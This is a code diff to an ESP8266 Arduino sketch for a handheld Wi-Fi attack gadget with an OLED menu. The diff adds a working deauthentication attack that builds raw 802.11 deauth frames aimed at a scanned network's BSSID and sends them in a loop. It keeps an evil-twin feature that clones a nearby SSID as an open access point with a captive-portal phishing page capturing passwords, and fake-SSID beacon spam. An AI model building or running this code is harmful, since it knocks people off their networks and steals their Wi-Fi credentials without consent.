@@ -4,6 +4,9 @@
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
 #include <DNSServer.h>
+extern "C" {
+  #include "user_interface.h"
+}
 
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
@@ -20,16 +23,82 @@ String capturedPassword = "";
 const int Dzax = D5;
 const int Enter = D4;
 const int Aj = D3;
+
 int dzax = HIGH;
 int enter = HIGH;
 int aj = HIGH;
 int prevDzax = HIGH;
 int prevEnter = HIGH;
 int prevAj = HIGH;
-int i = 0;
+
+bool inMainMenu = true;
+bool inWiFiMenu = false;
 bool wifibajin = true;
 
-String menyu[4] = {"WiFi-Clon", "BLE", "WiFi-Spam", "Settings"};
+// --- Մենյու ցուցակներ ---
+String mainMenu[4] = {"WiFi", "BLE", "Settings", "Exit"};
+String wifiMenu[4] = {"WiFi-Clon", "WiFi-Deauth", "WiFi-Spam", "Back"};
+
+// --- Deauth Attack ---
+#define MAX_NETS 20
+String ssidList[MAX_NETS];
+uint8_t bssidList[MAX_NETS][6];
+int chList[MAX_NETS];
+int netCount = 0;
+int deauthSelected = 0;
+bool deauthRunning = false;
+
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00,
+  0x3A, 0x01,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0x00, 0x00,
+  0x07, 0x00
+};
+
+void setTargetBSSID(uint8_t *bssid) {
+  for (int i = 0; i < 6; i++) {
+    deauthPacket[10 + i] = bssid[i];
+    deauthPacket[16 + i] = bssid[i];
+  }
+}
+
+void sendDeauth() {
+  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
+}
+
+void scanNetworksForDeauth() {
+  display.clearDisplay();
+  display.setCursor(0,0);
+  display.setTextSize(1);
+  display.println("Scanning WiFi...");
+  display.display();
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+
+  netCount = WiFi.scanNetworks();
+  if(netCount == 0) {
+    display.clearDisplay();
+    display.setCursor(0,0);
+    display.println("No networks found");
+    display.display();
+    delay(1500);
+    return;
+  }
+
+  if(netCount > MAX_NETS) netCount = MAX_NETS;
+
+  for(int n=0; n < netCount; n++) {
+    ssidList[n] = WiFi.SSID(n);
+    uint8_t *bssidPtr = WiFi.BSSID(n);
+    memcpy(bssidList[n], bssidPtr, 6);
+    chList[n] = WiFi.channel(n);
+  }
+}
 
 void startPhishingPage() {
   dnsServer.start(53, "*", WiFi.softAPIP());
@@ -62,7 +131,6 @@ void startPhishingPage() {
     display.display();
   });
 
-  // Captive Portal redirect
   server.onNotFound([]() {
     server.sendHeader("Location", "/", true);
     server.send(302, "text/plain", "");
@@ -71,11 +139,14 @@ void startPhishingPage() {
   server.begin();
 }
 
+// === WiFi-Clon with Back option ===
 void Clon() {
   int numNetworks = WiFi.scanNetworks();
   int selected = 0;
   int dzax, aj, enter;
   int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;
+
+  int totalOptions = numNetworks + 1; // +1 Back
 
   while (true) {
     dzax = digitalRead(Dzax);
@@ -85,8 +156,8 @@ void Clon() {
     if (dzax == LOW && prevDzax == HIGH) selected++;
     if (aj == LOW && prevAj == HIGH) selected--;
 
-    if (selected < 0) selected = numNetworks - 1;
-    if (selected >= numNetworks) selected = 0;
+    if (selected < 0) selected = totalOptions - 1;
+    if (selected >= totalOptions) selected = 0;
 
     display.clearDisplay();
     display.setTextSize(1);
@@ -94,65 +165,77 @@ void Clon() {
     display.setCursor(0, 0);
     display.println("WiFi Networks:");
 
-    for (int i = 0; i < numNetworks && i < 4; i++) {
+    int linesToShow = totalOptions > 4 ? 4 : totalOptions;
+
+    for (int i = 0; i < linesToShow; i++) {
       display.setCursor(0, 12 + i * 12);
       if (i == selected) display.print("> ");
       else display.print("  ");
-      display.println(WiFi.SSID(i));
+
+      if (i < numNetworks) {
+        display.println(WiFi.SSID(i));
+      } else {
+        display.println("Back");
+      }
     }
 
     display.display();
 
     if (enter == LOW && prevEnter == HIGH) {
-      selectedSSID = WiFi.SSID(selected);
-      Serial.println("Cloning: " + selectedSSID);
+      if (selected == numNetworks) {
+        // Back
+        break;
+      } else {
+        selectedSSID = WiFi.SSID(selected);
+        Serial.println("Cloning: " + selectedSSID);
 
-      WiFi.mode(WIFI_AP);
-      WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
-      WiFi.softAP(selectedSSID.c_str());
+        WiFi.mode(WIFI_AP);
+        WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
+        WiFi.softAP(selectedSSID.c_str());
 
-      startPhishingPage();
+        startPhishingPage();
 
-      display.clearDisplay();
-      display.setCursor(0, 0);
-      display.println("Cloned SSID:");
-      display.println(selectedSSID);
+        display.clearDisplay();
+        display.setCursor(0, 0);
+        display.println("Cloned SSID:");
+        display.println(selectedSSID);
 
-      display.print("RSSI: ");
-      display.println(WiFi.RSSI(selected));
+        display.print("RSSI: ");
+        display.println(WiFi.RSSI(selected));
 
-      display.print("CH: ");
-      display.println(WiFi.channel(selected));
+        display.print("CH: ");
+        display.println(WiFi.channel(selected));
 
-      display.print("Enc: ");
-      int enc = WiFi.encryptionType(selected);
-      switch (enc) {
-        case ENC_TYPE_NONE: display.println("Open"); break;
-        case ENC_TYPE_WEP: display.println("WEP"); break;
-        case ENC_TYPE_TKIP: display.println("WPA"); break;
-        case ENC_TYPE_CCMP: display.println("WPA2"); break;
-        case ENC_TYPE_AUTO: display.println("Auto"); break;
-        default: display.println("Unknown"); break;
-      }
-
-      display.println();
-      display.println("Press ENTER to stop");
-      display.display();
-
-      while (true) {
-        int waitEnter = digitalRead(Enter);
-        if (waitEnter == LOW) {
-          delay(300);
-          WiFi.softAPdisconnect(true);
-          dnsServer.stop();
-          server.stop();
-          WiFi.mode(WIFI_STA);
-          WiFi.disconnect();
-          break;
+        display.print("Enc: ");
+        int enc = WiFi.encryptionType(selected);
+        switch (enc) {
+          case ENC_TYPE_NONE: display.println("Open"); break;
+          case ENC_TYPE_WEP: display.println("WEP"); break;
+          case ENC_TYPE_TKIP: display.println("WPA"); break;
+          case ENC_TYPE_CCMP: display.println("WPA2"); break;
+          case ENC_TYPE_AUTO: display.println("Auto"); break;
+          default: display.println("Unknown"); break;
         }
-        dnsServer.processNextRequest();
-        server.handleClient();
-        delay(10);
+
+        display.println();
+        display.println("Press ENTER to stop");
+        display.display();
+
+        while (true) {
+          int waitEnter = digitalRead(Enter);
+          if (waitEnter == LOW) {
+            delay(300);
+            WiFi.softAPdisconnect(true);
+            dnsServer.stop();
+            server.stop();
+            WiFi.mode(WIFI_STA);
+            WiFi.disconnect();
+            break;
+          }
+          dnsServer.processNextRequest();
+          server.handleClient();
+          delay(10);
+        }
       }
     }
 
@@ -161,49 +244,208 @@ void Clon() {
     prevAj = aj;
     prevEnter = enter;
   }
-
   WiFi.scanDelete();
 }
 
-void spamWiFi() {
-  WiFi.mode(WIFI_AP);
-  int channel = 1;
+// === Deauth with Back option ===
+void deauthMenu() {
+  int dzaxLoc = digitalRead(Dzax);
+  int ajLoc = digitalRead(Aj);
+  int enterLoc = digitalRead(Enter);
+  static int prevDzaxLoc = HIGH;
+  static int prevAjLoc = HIGH;
+  static int prevEnterLoc = HIGH;
 
-  while (true) {
-    String fakeSSID = "Free_WiFi_" + String(random(1000, 9999));
+  int totalOptions = netCount + 1; // +1 Back
 
-    WiFi.softAP(fakeSSID.c_str(), "", channel);
+  if (dzaxLoc == LOW && prevDzaxLoc == HIGH) deauthSelected++;
+  if (ajLoc == LOW && prevAjLoc == HIGH) deauthSelected--;
 
-    display.clearDisplay();
-    display.setCursor(0, 0);
-    display.setTextSize(1);
-    display.println("Spamming:");
-    display.println(fakeSSID);
-    display.println("Press ENTER to stop");
-    display.display();
+  if (deauthSelected < 0) deauthSelected = totalOptions - 1;
+  if (deauthSelected >= totalOptions) deauthSelected = 0;
 
-    Serial.println("Spammed: " + fakeSSID);
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setCursor(0, 0);
+  display.println("Select Deauth Target:");
 
-    delay(300);
-    WiFi.softAPdisconnect(true);
+  int linesToShow = totalOptions > 4 ? 4 : totalOptions;
 
-    channel++;
-    if (channel > 13) channel = 1;
+  for(int k=0; k < linesToShow; k++) {
+    display.setCursor(0, 12 + k * 12);
+    if(k == deauthSelected) display.print("> ");
+    else display.print("  ");
 
-    int waitEnter = digitalRead(Enter);
-    if (waitEnter == LOW) {
-      delay(300);
-      WiFi.softAPdisconnect(true);
-      WiFi.mode(WIFI_STA);
-      break;
+    if (k < netCount) {
+      display.println(ssidList[k]);
+    } else {
+      display.println("Back");
+    }
+  }
+  display.display();
+
+  if(enterLoc == LOW && prevEnterLoc == HIGH) {
+    if (deauthSelected == netCount) {
+      // Back
+      deauthRunning = false;
+    } else {
+      deauthRunning = true;
+      wifi_set_channel(chList[deauthSelected]);
+      setTargetBSSID(bssidList[deauthSelected]);
+
+      display.clearDisplay();
+      display.setCursor(0,0);
+      display.println("Attacking:");
+      display.println(ssidList[deauthSelected]);
+      display.println("Press ENTER to stop");
+      display.display();
     }
   }
 
+  prevDzaxLoc = dzaxLoc;
+  prevAjLoc = ajLoc;
+  prevEnterLoc = enterLoc;
+}
+
+void deauthAttackLoop() {
+  sendDeauth();
+  delay(10);
+
+  int enterLoc = digitalRead(Enter);
+  static int prevEnterLoc = HIGH;
+
+  if(enterLoc == LOW && prevEnterLoc == HIGH) {
+    deauthRunning = false;
+    WiFi.disconnect();
+    scanNetworksForDeauth();
+    delay(500);
+  }
+  prevEnterLoc = enterLoc;
+}
+
+void runDeauth() {
+  if (netCount == 0) {
+    scanNetworksForDeauth();
+    delay(500);
+  }
+  deauthSelected = 0;
+  while (!deauthRunning) {
+    deauthMenu();
+    delay(100);
+  }
+  while (deauthRunning) {
+    deauthAttackLoop();
+    delay(10);
+  }
+}
+
+// === Spam WiFi with Back option ===
+void spamWiFiMenu() {
+  int channel = 1;
+  int selected = 0; // 0 = Start Spam, 1 = Back
+  int dzax, aj, enter;
+  int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;
+
+  while(true) {
+    dzax = digitalRead(Dzax);
+    aj = digitalRead(Aj);
+    enter = digitalRead(Enter);
+
+    if (dzax == LOW && prevDzax == HIGH) selected++;
+    if (aj == LOW && prevAj == HIGH) selected--;
+
+    if (selected < 0) selected = 1;
+    if (selected > 1) selected = 0;
+
+    display.clearDisplay();
+    display.setTextSize(1);
+    display.setCursor(0, 0);
+    display.println("WiFi Spam:");
+
+    display.setCursor(0, 16);
+    if (selected == 0) display.print("> ");
+    else display.print("  ");
+    display.println("Start Spam");
+
+    display.setCursor(0, 28);
+    if (selected == 1) display.print("> ");
+    else display.print("  ");
+    display.println("Back");
+
+    display.display();
+
+    if (enter == LOW && prevEnter == HIGH) {
+      if (selected == 1) {
+        // Back
+        break;
+      } else {
+        // Start Spam
+        while (true) {
+          String fakeSSID = "Free_WiFi_" + String(random(1000, 9999));
+          WiFi.softAP(fakeSSID.c_str(), "", channel);
+
+          display.clearDisplay();
+          display.setCursor(0, 0);
+          display.setTextSize(1);
+          display.println("Spamming:");
+          display.println(fakeSSID);
+          display.println("Press ENTER to stop");
+          display.display();
+
+          Serial.println("Spammed: " + fakeSSID);
+
+          delay(300);
+          WiFi.softAPdisconnect(true);
+
+          channel++;
+          if (channel > 13) channel = 1;
+
+          int waitEnter = digitalRead(Enter);
+          if (waitEnter == LOW) {
+            delay(300);
+            WiFi.softAPdisconnect(true);
+            WiFi.mode(WIFI_STA);
+            break;
+          }
+        }
+      }
+    }
+
+    prevDzax = dzax;
+    prevAj = aj;
+    prevEnter = enter;
+    delay(150);
+  }
+}
+
+void displayMainMenu(int selected) {
   display.clearDisplay();
-  display.setCursor(0, 0);
-  display.println("Spam stopped");
+  display.setTextSize(1);    // Փոքր տառեր
+  display.setTextColor(WHITE);
+  display.setCursor(20, 0);
+  display.println("==Main Menu==");
+  for (int j = 0; j < 4; j++) {
+    display.setCursor(18, 12 + j * 12); // փոքր տողեր
+    if (j == selected) display.print("> ");
+    else display.print("  ");
+    display.println(mainMenu[j]);
+  }
   display.display();
-  delay(1500);
+}
+
+void displayWiFiMenu(int selected) {
+  display.clearDisplay();
+  display.setTextSize(1);    // Փոքր տառեր
+  display.setTextColor(WHITE);
+  display.setCursor(20, 0);
+  display.println("==WiFi Menu==");
+  for (int j = 0; j < 4; j++) {
+    display.setCursor(18, 12 + j * 12);  // փոքր տողեր
+    if (j == selected) display.print("> ");
+    else display.print("  ");
+    display.println(wifiMenu[j]);
+  }
+  display.display();
 }
 
 void setup() {
@@ -225,20 +467,9 @@ void setup() {
   display.display();
   delay(1000);
 
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(WHITE);
-  display.setCursor(20, 0);
-  display.println("==ArmatRF Menu==");
+  scanNetworksForDeauth();
 
-  for (int j = 0; j < 4; j++) {
-    display.setCursor(10, 16 + j * 16);
-    if (j == i) display.print("> ");
-    else display.print("  ");
-    display.println(menyu[j]);
-  }
-
-  display.display();
+  displayMainMenu(0);
 }
 
 void loop() {
@@ -246,46 +477,83 @@ void loop() {
   enter = digitalRead(Enter);
   aj = digitalRead(Aj);
 
-  if (dzax == LOW && prevDzax == HIGH && wifibajin == true) i++;
-  if (aj == LOW && prevAj == HIGH && wifibajin == true) i--;
+  static int mainSelected = 0;
+  static int wifiSelected = 0;
 
-  if (i == 4) i = 0;
-  if (i == -1) i = 3;
+  if (inMainMenu) {
+    if (dzax == LOW && prevDzax == HIGH) mainSelected++;
+    if (aj == LOW && prevAj == HIGH) mainSelected--;
 
-  display.clearDisplay();
-  display.setTextSize(1);
-  display.setTextColor(WHITE);
-  display.setCursor(20, 0);
-  display.println("==ArmatRF Menu==");
+    if (mainSelected > 3) mainSelected = 0;
+    if (mainSelected < 0) mainSelected = 3;
 
-  if (wifibajin == true) {
-    for (int j = 0; j < 4; j++) {
-      display.setCursor(10, 14 + j * 14);
-      if (j == i) display.print("> ");
-      else display.print("  ");
-      display.println(menyu[j]);
+    displayMainMenu(mainSelected);
+
+    if (enter == LOW && prevEnter == HIGH) {
+      if (mainMenu[mainSelected] == "WiFi") {
+        inMainMenu = false;
+        inWiFiMenu = true;
+        wifiSelected = 0;
+        displayWiFiMenu(wifiSelected);
+      }
+      else if (mainMenu[mainSelected] == "BLE") {
+        display.clearDisplay();
+        display.setTextSize(1);
+        display.setCursor(0,0);
+        display.println("BLE ֆունկցիա");
+        display.display();
+        delay(1500);
+        displayMainMenu(mainSelected);
+      }
+      else if (mainMenu[mainSelected] == "Settings") {
+        display.clearDisplay();
+        display.setTextSize(1);
+        display.setCursor(0,0);
+        display.println("Settings");
+        display.display();
+        delay(1500);
+        displayMainMenu(mainSelected);
+      }
+      else if (mainMenu[mainSelected] == "Exit") {
+        display.clearDisplay();
+        display.setTextSize(1);
+        display.setCursor(0,0);
+        display.println("Exit");
+        display.display();
+        delay(1500);
+      }
     }
+  }
+  else if (inWiFiMenu) {
+    if (dzax == LOW && prevDzax == HIGH) wifiSelected++;
+    if (aj == LOW && prevAj == HIGH) wifiSelected--;
 
-    if (i == 0 && enter == LOW && prevEnter == HIGH) {
-      wifibajin = false;
-      WiFi.mode(WIFI_STA);
-      WiFi.disconnect();
-      delay(100);
-      Clon();
-      wifibajin = true;
+    if (wifiSelected > 3) wifiSelected = 0;
+    if (wifiSelected < 0) wifiSelected = 3;
+
+    displayWiFiMenu(wifiSelected);
+
+    if (enter == LOW && prevEnter == HIGH) {
+      if (wifiMenu[wifiSelected] == "WiFi-Clon") {
+        Clon();
+      }
+      else if (wifiMenu[wifiSelected] == "WiFi-Deauth") {
+        runDeauth();
+      }
+      else if (wifiMenu[wifiSelected] == "WiFi-Spam") {
+        spamWiFiMenu();
+      }
+      else if (wifiMenu[wifiSelected] == "Back") {
+        inWiFiMenu = false;
+        inMainMenu = true;
+        displayMainMenu(mainSelected);
+      }
     }
-
-    if (i == 2 && enter == LOW && prevEnter == HIGH) {
-      wifibajin = false;
-      spamWiFi();
-      wifibajin = true;
-    }
-
-    display.display();
   }
 
-  delay(200);
-  prevAj = aj;
   prevDzax = dzax;
+  prevAj = aj;
   prevEnter = enter;
+
+  delay(150);
 }
